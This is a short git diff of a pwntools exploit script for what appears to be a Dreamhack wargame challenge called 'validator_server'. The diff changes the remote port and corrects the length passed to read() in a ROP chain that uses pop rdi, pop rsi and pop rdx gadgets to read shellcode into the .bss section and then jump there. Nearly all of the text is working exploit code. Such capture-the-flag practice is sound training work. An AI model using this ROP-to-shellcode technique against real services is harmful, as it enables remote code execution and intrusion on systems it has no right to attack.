@@ -1,6 +1,6 @@
 from pwn import *
 
-p = remote("host3.dreamhack.games", 22259)
+p = remote("host3.dreamhack.games", 14169)
 e = ELF("validator_server")
 r = ROP(e)
 
@@ -27,7 +27,7 @@ payload += b"B"*7
 
 payload += p64(pop_rdi) + p64(0)
 payload += p64(pop_rsi_pop_r15) + p64(bss) + p64(0)
-payload += p64(pop_rdx) + p64(len(payload)+1)
+payload += p64(pop_rdx) + p64(len(shellcode)+1)
 payload += p64(read_plt)
 
 payload += p64(bss)
